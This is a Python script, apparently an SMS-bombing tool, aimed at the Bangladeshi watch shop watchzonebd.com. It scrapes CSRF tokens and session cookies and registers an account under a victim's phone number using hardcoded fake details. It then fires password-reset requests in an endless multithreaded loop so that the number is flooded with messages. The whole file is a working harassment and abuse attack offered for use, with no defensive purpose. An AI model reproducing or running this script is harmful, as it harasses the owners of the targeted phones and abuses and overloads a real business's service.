import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

# Predefined details
name = "Rahu"
email = "t73tuu@gmail.com"
address = "Chittagong"
password = "123456"

def send_registration_request(name, phone, email, address, password):
    """
    Fashionable API তে রেজিস্ট্রেশন রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    # Step 1: Extract _token and session cookie from /customer/register page
    url_get_register = "https://watchzonebd.com/customer/register"
    headers_get_register = {
        "Host": "watchzonebd.com",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        response_get_register = requests.get(url_get_register, headers=headers_get_register)
        soup_register = BeautifulSoup(response_get_register.text, 'html.parser')

        # Extract token
        token_register = soup_register.find('input', {'name': '_token'}).get('value') if soup_register.find('input', {'name': '_token'}) else None

        # Extract session cookie
        cookies_register = response_get_register.headers.get('Set-Cookie')
        watch_zone_session_register = None
        if cookies_register:
            for cookie in cookies_register.split(';'):
                if "watch_zone_session=" in cookie:
                    watch_zone_session_register = cookie.split('watch_zone_session=')[1].split(';')[0]
                    break

        if not token_register or not watch_zone_session_register:
            print("Failed to extract token or session from /customer/register.")
            return

        # Step 2: Send POST request to register
        url_post_register = "https://watchzonebd.com/customer/register"
        headers_post_register = {
            "Host": "watchzonebd.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://watchzonebd.com",
            "Referer": "https://watchzonebd.com/customer/register",
            "Cookie": f"watch_zone_session={watch_zone_session_register}"
        }

        data_post_register = {
            "_token": token_register,
            "loginDetail": "",
            "name": name,
            "phone": phone,
            "email": email,
            "address": address,
            "password": password,
            "password_confirmation": password
        }

        response_post_register = requests.post(url_post_register, headers=headers_post_register, data=data_post_register)

        soup_register_post = BeautifulSoup(response_post_register.text, 'html.parser')
        error_message_register = soup_register_post.find('span', {'class': 'invalid-feedback'})

        if error_message_register:
            print(f"Error: {error_message_register.find('small').text.strip()}")
        else:
            print(f"Register Successfully for {phone}")
            total_requests += 1

    except Exception as e:
        print(f"Error during registration: {e}")

def send_password_reset_request(phone):
    """
    Fashionable API তে পাসওয়ার্ড রিসেট রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    # Step 3: Extract _token and session cookie from /customer/password/forgot page
    url_get_password = "https://watchzonebd.com/customer/password/forgot"
    headers_get_password = {
        "Host": "watchzonebd.com",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        response_get_password = requests.get(url_get_password, headers=headers_get_password)
        soup_password = BeautifulSoup(response_get_password.text, 'html.parser')

        # Extract token
        token_password = soup_password.find('input', {'name': '_token'}).get('value') if soup_password.find('input', {'name': '_token'}) else None

        # Extract session cookie
        cookies_password = response_get_password.headers.get('Set-Cookie')
        watch_zone_session_password = None
        if cookies_password:
            for cookie in cookies_password.split(';'):
                if "watch_zone_session=" in cookie:
                    watch_zone_session_password = cookie.split('watch_zone_session=')[1].split(';')[0]
                    break

        if not token_password or not watch_zone_session_password:
            print("Failed to retrieve token or session cookie for /customer/password/forgot.")
            return

        # Step 4: Send POST request to forgot password
        url_post_password = "https://watchzonebd.com/customer/password/forgot"
        headers_post_password = {
            "Host": "watchzonebd.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://watchzonebd.com",
            "Referer": "https://watchzonebd.com/customer/password/forgot",
            "Cookie": f"watch_zone_session={watch_zone_session_password}"
        }

        data_post_password = {
            "_token": token_password,
            "phone": phone
        }

        response_post_password = requests.post(url_post_password, headers=headers_post_password, data=data_post_password)

        soup_password_post = BeautifulSoup(response_post_password.text, 'html.parser')
        canonical_link_password = soup_password_post.find('link', {'rel': 'canonical'})

        if canonical_link_password:
            print(f"Canonical link: {canonical_link_password['href']}")
        else:
            print("Canonical link not found for password reset.")
        
        total_requests += 1

    except Exception as e:
        print(f"Error during password reset: {e}")

def send_requests(phone, threads):
    """
    মাল্টিথ্রেডিং ব্যবহার করে Fashionable API তে রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # Validate phone number
    if len(phone) != 11 or not phone.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # Send registration request once
    send_registration_request(name, phone, email, address, password)

    # Send password reset request continuously
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [
                executor.submit(send_password_reset_request, phone)
            ]
            for future in futures:
                future.result()

def main(phone, threads):
    """
    Main function to start sending requests.
    """
    send_requests(phone, threads)

if __name__ == "__main__":
    phone = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads (1-50): "))
    main(phone, threads)
